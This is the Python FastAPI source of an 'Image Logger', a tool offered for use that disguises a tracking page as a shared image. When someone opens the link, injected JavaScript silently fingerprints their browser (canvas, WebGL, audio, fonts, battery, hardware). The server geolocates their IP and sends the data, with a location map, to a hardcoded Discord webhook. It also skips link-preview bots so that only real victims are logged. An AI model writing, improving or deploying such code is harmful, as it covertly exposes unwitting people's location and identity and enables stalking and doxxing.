from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, RedirectResponse, Response
import requests
import re
import json
import time
import asyncio
from datetime import datetime, timezone
from collections import defaultdict
from cachetools import TTLCache
from user_agents import parse as ua_parse
from pathlib import Path

app = FastAPI()

config = {
    "webhooks": [
        "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
        # adiciona webhooks de fallback aqui
    ],
    "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "buggedImage": False,
    "vpnCheck": 1,
    "antiBot": 1,
    "linkAlerts": True,
    "blacklistedCountries": [],       # ex: ["CN", "RU", "KP"]
    "suspiciousASNs": {               # ASN watchlist — datacenter/scanner conhecidos
        "AS14061": "DigitalOcean",
        "AS16509": "AWS",
        "AS15169": "Google",
        "AS13335": "Cloudflare",
        "AS8075":  "Microsoft Azure",
        "AS20473": "Vultr",
        "AS14618": "Amazon",
        "AS396982": "Google Cloud",
    },
    "torUpdateInterval": 3600,        # segundos entre refreshes da lista Tor
    "geoapifyKey": "",                # chave Geoapify (deixa vazio pra usar staticmap)
    "logFile": "hits.jsonl",
    "rateLimitTTL": 30,               # segundos de janela de rate limit por IP
    "hitAlertThreshold": 2,           # hits acima desse número geram alerta de repetição
}

blacklistedIPs = ("27", "104", "143", "164")

_rate_cache: TTLCache = TTLCache(maxsize=10_000, ttl=config["rateLimitTTL"])
_hit_counter: defaultdict = defaultdict(int)
_hit_timestamps: defaultdict = defaultdict(list)
_tor_exit_nodes: set = set()
_session_start: float = time.time()
_total_hits: int = 0
_log_path: Path = Path(config["logFile"])


# ── Tor exit node list ──────────────────────────────────────────────
async def refresh_tor_list():
    global _tor_exit_nodes
    while True:
        try:
            resp = requests.get(
                "https://check.torproject.org/torbulkexitlist",
                timeout=10
            )
            if resp.status_code == 200:
                _tor_exit_nodes = set(resp.text.strip().splitlines())
        except Exception:
            pass
        await asyncio.sleep(config["torUpdateInterval"])


@app.on_event("startup")
async def startup():
    asyncio.create_task(refresh_tor_list())


# ── Utilitários de IP (versão original) ────────────────────────────
def normalize_ip(ip: str) -> str:
    mapped = re.match(r"^::ffff:(\d+\.\d+\.\d+\.\d+)$", ip, re.IGNORECASE)
    return mapped.group(1) if mapped else ip


def extract_ip(request: Request) -> str:
    ip = request.headers.get("x-forwarded-for") or (
        request.client.host if request.client else "Unknown"
    )
    if "," in str(ip):
        ip = ip.split(",")[0].strip()
    return normalize_ip(ip)


# ── Bot detection ───────────────────────────────────────────────────
def bot_check(ip: str, useragent: str):
    if not ip:
        return False
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


# ── Headless browser detection ──────────────────────────────────────
def detect_headless(useragent: str, hints: dict) -> bool:
    if hints.get("sec_ch_ua") == "Unknown" and hints.get("accept_language") in ("*", "Unknown"):
        return True
    for pattern in [r"HeadlessChrome", r"PhantomJS", r"Selenium", r"puppeteer", r"playwright"]:
        if re.search(pattern, useragent, re.IGNORECASE):
            return True
    return False


# ── User agent parsing ──────────────────────────────────────────────
def parse_useragent(raw_ua: str) -> dict:
    ua = ua_parse(raw_ua)
    os_str = ua.os.family + (f" {ua.os.version_string}" if ua.os.version_string else "")
    browser_str = ua.browser.family + (f" {ua.browser.version_string}" if ua.browser.version_string else "")
    device = "Desktop"
    if ua.is_mobile:
        device = "Mobile"
    elif ua.is_tablet:
        device = "Tablet"
    elif ua.is_bot:
        device = "Bot"
    return {"os": os_str, "browser": browser_str, "device": device, "is_bot": ua.is_bot}


# ── Client hints ────────────────────────────────────────────────────
def collect_hint_headers(request: Request) -> dict:
    h = request.headers
    return {
        "accept_language":    h.get("accept-language", "Unknown"),
        "accept_encoding":    h.get("accept-encoding", "Unknown"),
        "sec_ch_ua":          h.get("sec-ch-ua", "Unknown"),
        "sec_ch_ua_platform": h.get("sec-ch-ua-platform", "Unknown"),
        "sec_ch_ua_mobile":   h.get("sec-ch-ua-mobile", "Unknown"),
        "dnt":                h.get("dnt", "Unknown"),
    }


# ── Mapa estático ───────────────────────────────────────────────────
def build_map_url(lat: float, lon: float) -> str | None:
    if config["geoapifyKey"]:
        return (
            f"https://maps.geoapify.com/v1/staticmap"
            f"?style=osm-bright&width=400&height=250"
            f"&center=lonlat:{lon},{lat}&zoom=12"
            f"&marker=lonlat:{lon},{lat};color:%23ff0000;size:medium"
            f"&apiKey={config['geoapifyKey']}"
        )
    return (
        f"https://staticmap.de/?center={lat},{lon}"
        f"&zoom=12&size=400x250"
        f"&markers={lat},{lon},red"
    )


# ── Webhook com fallback ────────────────────────────────────────────
def send_webhook(payload: dict) -> bool:
    for webhook_url in config["webhooks"]:
        try:
            resp = requests.post(webhook_url, json=payload, timeout=8)
            if resp.status_code in (200, 204):
                return True
        except Exception:
            continue
    return False


# ── Log local JSONL ─────────────────────────────────────────────────
def append_log(record: dict):
    try:
        with _log_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
    except Exception:
        pass


# ── Core report ─────────────────────────────────────────────────────
def build_and_send_embed(ip: str, useragent: str, hints: dict,
                          fp: dict, endpoint: str = "/api/image"):
    global _total_hits

    if not ip or ip.startswith(blacklistedIPs):
        return

    in_window = ip in _rate_cache
    _rate_cache[ip] = True
    _hit_counter[ip] += 1
    _hit_timestamps[ip].append(time.time())
    _total_hits += 1
    hit_count = _hit_counter[ip]

    bot = bot_check(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            send_webhook({
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger — Link Enviado",
                    "color": config["color"],
                    "description": (
                        f"**Link foi enviado!**\n\n"
                        f"**Endpoint:** `{endpoint}`\n"
                        f"**IP:** `{ip}`\n"
                        f"**Plataforma:** `{bot}`"
                    )
                }]
            })
        return

    if in_window and hit_count > 1:
        if hit_count >= config["hitAlertThreshold"]:
            timestamps = _hit_timestamps[ip]
            delta = f"{timestamps[-1] - timestamps[-2]:.1f}s" if len(timestamps) >= 2 else "N/A"
            send_webhook({
                "username": config["username"],
                "embeds": [{
                    "title": "⚠️ Image Logger — Hit Repetido",
                    "color": 0xFF6600,
                    "description": (
                        f"**IP:** `{ip}`\n"
                        f"**Total de hits:** `{hit_count}`\n"
                        f"**Delta entre hits:** `{delta}`\n"
                        f"**Endpoint:** `{endpoint}`"
                    )
                }]
            })
        return

    try:
        info = requests.get(
            f"http://ip-api.com/json/{ip}?fields=16976857",
            timeout=6
        ).json()
    except Exception:
        info = {}

    country_code = info.get("countryCode", "")
    if country_code in config["blacklistedCountries"]:
        return

    ping = "@everyone"
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    if info.get("hosting"):
        if config["antiBot"] == 2:
            return
        if config["antiBot"] == 1:
            ping = ""

    is_tor = ip in _tor_exit_nodes
    asn_raw = info.get("as", "")
    asn_tag = ""
    for asn_id, asn_name in config["suspiciousASNs"].items():
        if asn_id in asn_raw:
            asn_tag = f" ⚠️ ({asn_name})"
            break

    ua_data = parse_useragent(useragent or "")
    is_headless = detect_headless(useragent or "", hints)

    lat = info.get("lat", 0)
    lon = info.get("lon", 0)
    maps_link = f"[{lat}, {lon}](https://www.google.com/maps?q={lat},{lon})"
    map_url = build_map_url(lat, lon)
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    risk_flags = []
    if is_tor:                risk_flags.append("🧅 Tor Exit Node")
    if info.get("proxy"):     risk_flags.append("🔒 VPN/Proxy")
    if info.get("hosting"):   risk_flags.append("🖥️ Datacenter")
    if is_headless:           risk_flags.append("🤖 Headless Browser")
    if asn_tag:               risk_flags.append(f"⚠️ ASN Suspeito{asn_tag}")

    ip_tz = info.get("timezone", "Unknown")
    browser_tz = fp.get("timezone", "Unknown")
    tz_mismatch = (
        browser_tz != "Unknown"
        and ip_tz != "Unknown"
        and browser_tz != ip_tz
    )
    if tz_mismatch:
        risk_flags.append("🕐 Timezone Mismatch")

    risk_line = " | ".join(risk_flags) if risk_flags else "✅ Nenhum"

    description = f"""**Um usuário abriu a imagem original!**

**Endpoint:** `{endpoint}`
**Horário:** `{timestamp}`
**Hit #{hit_count} deste IP**

**🚩 Flags de Risco:**
> {risk_line}

**Info de IP:**
> **IP:** `{ip}`
> **Provedor:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{asn_raw}{asn_tag}`
> **País:** `{info.get('country', 'Unknown')} ({country_code})`
> **Região:** `{info.get('regionName', 'Unknown')}`
> **Cidade:** `{info.get('city', 'Unknown')}`
> **Coords (IP):** {maps_link}
> **Fuso Horário IP:** `{ip_tz}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Tor:** `{is_tor}`
> **Bot/DC:** `{info.get('hosting', False)}`

**🖥️ Info do PC:**
> **OS:** `{ua_data['os']}`
> **Browser:** `{ua_data['browser']}`
> **Dispositivo:** `{ua_data['device']}`
> **Headless:** `{is_headless}`
> **Resolução:** `{fp.get('screen', 'Unknown')}`
> **Pixel Ratio:** `{fp.get('pixelRatio', 'Unknown')}`
> **Color Depth:** `{fp.get('colorDepth', 'Unknown')} bits`
> **Janela:** `{fp.get('window', 'Unknown')}`

**🌐 Browser Fingerprint:**
> **Timezone OS:** `{browser_tz}`{"  ⚠️ MISMATCH" if tz_mismatch else ""}
> **Idioma:** `{fp.get('language', 'Unknown')}`
> **Plataforma:** `{fp.get('platform', 'Unknown')}`
> **Núcleos CPU:** `{fp.get('cores', 'Unknown')}`
> **Memória RAM:** `{fp.get('memory', 'Unknown')} GB`
> **Touch:** `{fp.get('touch', 'Unknown')}`
> **Conexão:** `{fp.get('connection', 'Unknown')}`
> **Downlink:** `{fp.get('downlink', 'Unknown')} Mbps`
> **RTT:** `{fp.get('rtt', 'Unknown')} ms`
> **Bateria:** `{fp.get('battery', 'Unknown')}`
> **Canvas Hash:** `{fp.get('canvasHash', 'Unknown')}`
> **WebGL Vendor:** `{fp.get('webglVendor', 'Unknown')}`
> **WebGL Renderer:** `{fp.get('webglRenderer', 'Unknown')}`
> **Audio FP:** `{fp.get('audioFingerprint', 'Unknown')}`
> **Fontes Detectadas:** `{fp.get('fonts', 'Unknown')}`
> **Do Not Track:** `{fp.get('dnt', 'Unknown')}`

**Client Hints:**
> **Sec-CH-UA:** `{hints['sec_ch_ua']}`
> **Plataforma CH:** `{hints['sec_ch_ua_platform']}`
> **Mobile CH:** `{hints['sec_ch_ua_mobile']}`
> **Encoding:** `{hints['accept_encoding']}`

**User Agent:**
```
{useragent}
```"""

    embed: dict = {
        "title": "Image Logger — IP + Fingerprint Registrado",
        "color": config["color"],
        "description": description,
        "thumbnail": {"url": config["image"]},
        "footer": {"text": f"Image Logger • {timestamp}"},
    }
    if map_url:
        embed["image"] = {"url": map_url}

    send_webhook({
        "username": config["username"],
        "content": ping,
        "embeds": [embed],
    })

    append_log({
        "timestamp": timestamp,
        "ip": ip,
        "hit_count": hit_count,
        "country": info.get("country", "Unknown"),
        "country_code": country_code,
        "city": info.get("city", "Unknown"),
        "isp": info.get("isp", "Unknown"),
        "asn": asn_raw,
        "lat": lat,
        "lon": lon,
        "os": ua_data["os"],
        "browser": ua_data["browser"],
        "device": ua_data["device"],
        "is_headless": is_headless,
        "is_tor": is_tor,
        "is_vpn": bool(info.get("proxy")),
        "is_hosting": bool(info.get("hosting")),
        "tz_mismatch": tz_mismatch,
        "useragent": useragent,
        "endpoint": endpoint,
        "risk_flags": risk_flags,
        "fingerprint": fp,
    })


# ── Endpoints ───────────────────────────────────────────────────────

@app.get("/health")
async def health():
    uptime_seconds = int(time.time() - _session_start)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return {
        "status": "ok",
        "uptime": f"{hours:02d}:{minutes:02d}:{seconds:02d}",
        "total_hits": _total_hits,
        "unique_ips": len(_hit_counter),
        "tor_exit_nodes_loaded": len(_tor_exit_nodes),
        "webhooks_configured": len(config["webhooks"]),
        "log_file": str(_log_path.resolve()),
    }


@app.post("/api/fp")
async def receive_fingerprint(request: Request, background_tasks: BackgroundTasks):
    """
    Recebe o fingerprint coletado pelo JS no frontend.
    Cruza com os dados de IP e dispara o embed completo.
    """
    try:
        fp = await request.json()
    except Exception:
        return {"status": "error"}

    ip = extract_ip(request)
    useragent = request.headers.get("user-agent", "")
    hints = collect_hint_headers(request)

    background_tasks.add_task(
        build_and_send_embed, ip, useragent, hints, fp
    )
    return {"status": "ok"}


@app.get("/")
@app.get("/api/image")
async def logger(request: Request, background_tasks: BackgroundTasks):
    ip = extract_ip(request)
    useragent = request.headers.get("user-agent", "")
    hints = collect_hint_headers(request)

    if bot_check(ip, useragent):
        background_tasks.add_task(build_and_send_embed, ip, useragent, hints, {})
        if config["buggedImage"]:
            return Response(content=b"", media_type="image/jpeg")
        return RedirectResponse(url=config["image"], status_code=302)

    html = f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
<script>
(async function() {{
  const fp = {{}};

  // Timezone do OS
  try {{ fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; }} catch(e) {{}}

  // Idioma e plataforma
  fp.language = navigator.language || navigator.userLanguage || 'Unknown';
  fp.platform  = navigator.platform || 'Unknown';
  fp.cores     = navigator.hardwareConcurrency || 'Unknown';
  fp.memory    = navigator.deviceMemory || 'Unknown';
  fp.dnt       = navigator.doNotTrack || window.doNotTrack || 'Unknown';

  // Screen
  fp.screen     = screen.width + 'x' + screen.height;
  fp.colorDepth = screen.colorDepth;
  fp.pixelRatio = window.devicePixelRatio || 1;
  fp.window     = window.innerWidth + 'x' + window.innerHeight;

  // Touch
  fp.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0)
    ? 'Sim (' + navigator.maxTouchPoints + ' pontos)'
    : 'Não';

  // Network Information API
  try {{
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {{
      fp.connection = conn.effectiveType || conn.type || 'Unknown';
      fp.downlink   = conn.downlink   || 'Unknown';
      fp.rtt        = conn.rtt        || 'Unknown';
    }} else {{
      fp.connection = 'Unknown'; fp.downlink = 'Unknown'; fp.rtt = 'Unknown';
    }}
  }} catch(e) {{ fp.connection = 'Unknown'; fp.downlink = 'Unknown'; fp.rtt = 'Unknown'; }}

  // Battery API
  try {{
    const bat = await navigator.getBattery();
    fp.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '(carregando)' : '(descarregando)');
  }} catch(e) {{ fp.battery = 'Unknown'; }}

  // Canvas Fingerprint
  try {{
    const c = document.createElement('canvas');
    c.width = 200; c.height = 40;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('SentinelFlow 🔒', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('SentinelFlow 🔒', 4, 17);
    const data = c.toDataURL();
    let hash = 0;
    for (let i = 0; i < data.length; i++) {{
      hash = ((hash << 5) - hash) + data.charCodeAt(i);
      hash |= 0;
    }}
    fp.canvasHash = hash.toString(16);
  }} catch(e) {{ fp.canvasHash = 'Unknown'; }}

  // WebGL Fingerprint
  try {{
    const gl = document.createElement('canvas').getContext('webgl')
            || document.createElement('canvas').getContext('experimental-webgl');
    if (gl) {{
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      fp.webglVendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
      fp.webglRenderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    }}
  }} catch(e) {{ fp.webglVendor = 'Unknown'; fp.webglRenderer = 'Unknown'; }}

  // Audio Fingerprint
  try {{
    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    const ctx = new AudioCtx();
    const osc = ctx.createOscillator();
    const analyser = ctx.createAnalyser();
    const gain = ctx.createGain();
    const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0;
    osc.connect(analyser);
    analyser.connect(scriptProcessor);
    scriptProcessor.connect(gain);
    gain.connect(ctx.destination);
    osc.start(0);
    await new Promise(resolve => {{
      scriptProcessor.onaudioprocess = function(e) {{
        const buf = e.inputBuffer.getChannelData(0);
        let sum = 0;
        for (let i = 0; i < buf.length; i++) sum += Math.abs(buf[i]);
        fp.audioFingerprint = sum.toString(16).slice(0, 12);
        osc.stop(); ctx.close();
        resolve();
      }};
    }});
  }} catch(e) {{ fp.audioFingerprint = 'Unknown'; }}

  // Font enumeration via CSS
  try {{
    const testFonts = [
      'Arial','Times New Roman','Courier New','Georgia','Verdana',
      'Trebuchet MS','Impact','Comic Sans MS',
      'Noto Sans CJK SC','MS Gothic','Malgun Gothic','Arial Unicode MS',
      'Tahoma','Calibri','Segoe UI','Roboto','Ubuntu','Helvetica Neue',
      'SimSun','MingLiU','BatangChe','Gulim','Dotum',
      'Noto Serif','Noto Sans','Noto Sans Arabic','Noto Sans Hebrew',
      'Lohit Devanagari','Lohit Tamil','Garuda','Padauk'
    ];
    const detected = [];
    for (const font of testFonts) {{
      if (document.fonts.check('12px "' + font + '"')) detected.push(font);
    }}
    fp.fonts = detected.join(', ') || 'Nenhuma detectada';
  }} catch(e) {{ fp.fonts = 'Unknown'; }}

  // Envia pro backend silenciosamente
  try {{
    await fetch('/api/fp', {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify(fp),
      keepalive: true
    }});
  }} catch(e) {{}}
}})();
</script>
</body>
</html>"""
    return HTMLResponse(content=html)
